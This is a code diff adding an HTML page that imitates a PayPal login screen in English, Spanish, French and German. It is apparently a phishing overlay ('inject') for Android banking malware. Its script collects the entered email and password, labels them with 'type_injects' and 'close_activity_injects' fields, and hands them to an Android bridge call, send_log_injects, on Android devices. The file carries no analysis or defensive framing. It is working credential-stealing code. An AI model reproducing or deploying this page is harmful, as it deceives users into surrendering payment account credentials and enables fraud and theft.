@@ -1,0 +1,212 @@
+<!DOCTYPE html> 
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title></title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #fff;
+            font-family: sans-serif;
+            font-weight: 100 !important;
+        }
+
+        #form1 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            text-align: center;
+            padding: 20px;
+            padding-bottom: 50px;
+        }
+
+        section {
+            flex: 1;
+            padding: 20px;
+            margin-top: 50px;
+        }
+
+        .input {
+            width: 100%;
+            border: 0;
+            border-bottom: 1px solid #dddddd;
+            padding: 10px; 
+            padding-left: 0;
+            margin-bottom: 15px;
+        }
+
+        .input:focus {
+            width: 100%;
+            border: 0;
+            border-bottom: 2px solid #007db7;
+            padding: 10px; 
+            padding-left: 0;
+        }
+
+        p {
+            text-align: center;
+            color: #8bc63f;
+            font-size: 12px;
+        }
+
+        label {
+            margin: 0;
+            padding: 0;
+            color: #a5a5a5;
+        }
+
+        form {
+            padding: 0;
+            margin: 0;
+        }
+
+        .button {
+            padding: 15px;
+            background: #007db7;
+            width: 100%;
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            border: 0;
+        }
+
+        .button:disabled {
+            padding: 15px;
+            background: #e1e1e1;
+            width: 100%;
+            color: #fff;
+            font-size: 16px;
+            border: 0;
+            font-weight: 100;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+</style>
+</head>
+<body ng-controller="c1">
+    <form id="form" onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width: 40px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAvCAIAAAAemR+CAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RTFCMjM3RDczMzU3MTFFOUJGREJEQTU0OEY1NUZCOTgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RTFCMjM3RDgzMzU3MTFFOUJGREJEQTU0OEY1NUZCOTgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFMUIyMzdENTMzNTcxMUU5QkZEQkRBNTQ4RjU1RkI5OCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFMUIyMzdENjMzNTcxMUU5QkZEQkRBNTQ4RjU1RkI5OCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Psp/9XUAAAW6SURBVHja3JhLbxtVFMfvnbkzdx722HFejls3bdKSF22qStBKICGQuqjYlA2CdVewrVizQqwQEnv4AHwDWIBABFgVSgspbZqUvO04ftvzvsOZJCR2fB3bMagSo9Fo5Jnxb849//M/9w4OggA9j01Az2l7bmDS7gJkYLdkLi7vOp7f8V9EEScH9cGYGtVkWSYC7gOcL5kff/FzqWKVqrZpe5btPVzaObyqKRKVxYgmxyJUoQTAwwORfNlKJpTZyeFbr0ykkwa8wAlg3E5cC79ufPDpt4srOdvxGAvvgtBFAfssvF/cC0oUBIwRHGCvmS78MpLQCCFnR6PX51J33rrywviASklvEW/lKvcfZ+qW2/jjPvXwxGfHs5DN1+G4vVN58Di7cH/9/bev3X79IqSgB3EtrRVheE8nHBgg03YfLGU/+vynr35ccVy/W3ChbD1cyrH+Ktx1/fXt0pdfP8oV692CjYj8+9Od/mvG9fxc0YQYWoXEBxcr9rPNEtRU/+x82fxjOccY6wr8ZLVQrjv/ilHAOENVuH7Qlap/WdxmDN6JtdgK7AwFfuexgDqDHeG4TreytdaiJVxN3nuUGYjKhXKLqoHqVsNjOHRBaG/MRVgMXyWEiXtHIdzD3wUkkJVVJ6LPPl0rvHhxuAPYsrzdkuW4Ls9IGfI9DOxmDbWcHGZSJIKwUPZuGYbHgkYv5eS4ULX+/Ku470StYMzsXlIc2Lr+TVW8s1D4PmN7DQMu8FzaqrRTVpjgXqQuCEihQURfLNqfPKysVLzgBHA2X6vWrDZgv7cSE8VAVZGmBow9q7jfbdmH8j4Ohn6wma2Zlocx5kiaeSjoxUcVipKjSJbDurL8e3m33g4M7r+Zq4L7t+larAcqFgIAn0uDxELhsaDk+EWb8cGFsrmRrbB2Nu173VORqqBrV9FgAu2NnemxjbpnszYR10wvBLeGG1qHj1nXYFkKZqfRzBScHIw6EWbiNCoJ/DqGiLdyNf4wB25XCQZxgJInJ9DL15B61InrXqCKKCphPtjzg8xuve007IRagis4lDGKx4LLc2huBsWijdc1SbxkECq2AWfyNebzFAT3+86eF/oHBbrvxnjvGhGRooTU9JlgZhqlxkI9N2/zCXkuLhPMA4OSV7fKa5kSP9yohgITEeWglKmMjCjS9UBTke2gsSQ6mwqlJEmopRRhUjZE8VTsyDRJcxu2nq4XuQEjGKLkcDCZRlEdRXQkyYjSMG7AqDQMl8c73OKU3B7XElTgNwldlaET8x+F2oDMJYzQDSSCCOm+nlVJfDOtvjFGpYYm0fR83XZXNgpUFmzHP+Z8MJOGCRGKGb1OBEBTVwaVu3PGmEbatsXsbh0aot8yW0C+jyIa0mjPVCJeHaIfzhtzcYJPmAhs7lQth3ncJOtqY1F27g4CNih5dVR5bypyY4SzqmkC//Yka9m8NkylMOKTZzlBaA6GJMShVAU8PyDdTCmvJWlKJbJ44krC91m+aHEn36GUonywSoT5IeWlIaoSDJodpPiCTs4bUlonBjlY6XRYwrgee7xW4LQHiAb8VueDJ2PSZ9fjMJIjijiqhEspEeNucnEEhliXVoucuTS8CvwVT1nQsy9FyWxc1gnuVXdHFb2yWXy2WWxbxIrMU5BwISppvVObwLbDChWL79KgLInjGJBBcMHTYBvBP9xf37f841woJFCWyAHLGE1GpX4/RcAq9nwqvls+6okTZ+LL60U1Qv3p9DZPn4YsnNPFfsHv3Jy+cTnltpTTrh3cXbS3y/6xZgzKGtEkYPcLppRMjSda71iueLVHmYNFSnPqk6qgkVOCOz+2Y7J/ZhhN24AszBiicsqRRp27W87x01G57DDTZ1U3xEckDHM2FwkpnUgC/q/AVwbk2RghgbwfNCDBLs5EJDDLdyf0U6+bccdvmXC96gVOs5Xi0KWx0qU9ng78f/uW+bcAAwCaHG3sNqJePgAAAABJRU5ErkJggg==">
+            </header>
+            <section>
+                <input type="email" class="input" id="email" name="email" placeholder="{{t.__text1}}" onkeyup="chekFirst()" autocomplete="off">
+                
+                <input type="password" class="input" id="password" name="password" onkeyup="chekFirst()" placeholder="{{t.__text2}}">
+                <span style="float: right;position: relative;top: -50px;right: 0;color: #007db7;">{{t.__text3}}</span>
+
+
+                <span style="color: #007db7;float: right;display: block;width: 100%;text-align: center;font-size: 14px;font-weight: 100;margin-bottom: 35px;">{{t.__text4}}</span>
+            </section>
+            <footer>
+                <input type="submit" class="button" id="sendData" disabled value="{{t.__text5}}">
+            </footer>
+        </div>
+    </form>
+
+    <script>
+        var form1 = document.getElementById('form1'),
+            form = document.getElementById('form'),
+            email = document.getElementById('email'),
+            password = document.getElementById('password'),
+            sendData = document.getElementById('sendData');
+
+        function chekFirst() {
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(email.value) && password.value.length > 5) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.login = email.value;
+                data.password = password.value;
+                data.type_injects = "wallets";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+    <script>
+        var text, 
+            link = "paypal.com", 
+            appname = "PayPal", 
+            texts = { 
+
+                en: { 
+                    __text1: "Email Address",
+                    __text2: "Password",
+                    __text3: "Forgotten?",
+                    __text4: "New To PayPal? Register now",
+                    __text5: "Login",
+                }, 
+
+                es: { 
+                    __text1: "Dirección de correo electrónico",
+                    __text2: "Contraseña",
+                    __text3: "¿Olvidado?",
+                    __text4: "Nuevo en PayPal? Regístrese ahora",
+                    __text5: "Sesión",
+                }, 
+
+                fr: { 
+                    __text1: "Adresse",
+                    __text2: "Mot de passe",
+                    __text3: "Oublié?",
+                    __text4: "Nouveau À PayPal? Inscrivez-vous maintenant",
+                    __text5: "Connexion",
+                },
+
+                de: { 
+                    __text1: "E-Mail-Adresse",
+                    __text2: "Passwort",
+                    __text3: "Vergessen?",
+                    __text4: "Neu Bei PayPal? Jetzt registrieren",
+                    __text5: "Login",
+                }, 
+            }
+
+
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+        </script>
+</body>
+</html>
